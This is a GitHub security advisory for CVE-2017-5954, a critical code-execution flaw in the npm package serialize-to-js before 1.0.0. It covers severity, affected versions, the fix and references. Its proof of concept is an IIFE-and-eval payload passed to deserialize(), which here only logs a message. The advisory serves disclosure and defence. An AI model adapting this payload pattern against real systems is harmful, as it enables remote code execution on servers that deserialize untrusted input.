# [C] Code Execution Through IIFE in serialize-to-js

## Summary
Severity: Critical
Advisory: GHSA-mm62-wxc8-cf7m
CVE: CVE-2017-5954
CWE: CWE-502
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2018-07-18
Source: https://github.com/advisories/GHSA-mm62-wxc8-cf7m
Type: github-advisory

## Affected
- npm: `serialize-to-js` — affected >=0 <1.0.0

## Details
Affected versions of `serialize-to-js` may be vulnerable to arbitrary code execution through an Immediately Invoked Function Expression (IIFE). 

## Proof of Concept
```js
var payload = "{e: (function(){ eval('console.log(`exploited`)') })() }"
var serialize = require('serialize-to-js');
serialize.deserialize(payload);
```


## Recommendation

Update to version 1.0.0, or later, and review [this disclaimer](https://www.npmjs.com/package/serialize-to-js#deserialize) from the author.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-5954
- https://github.com/commenthol/serialize-to-js/issues/1
- https://github.com/commenthol/serialize-to-js/commit/1cd433960e5b9db4c0b537afb28366198a319429
- https://github.com/advisories/GHSA-mm62-wxc8-cf7m
- https://github.com/commenthol/serialize-to-js
- https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution
- https://www.npmjs.com/advisories/313
- https://www.npmjs.com/package/serialize-to-js#deserialize
- http://www.securityfocus.com/bid/96223
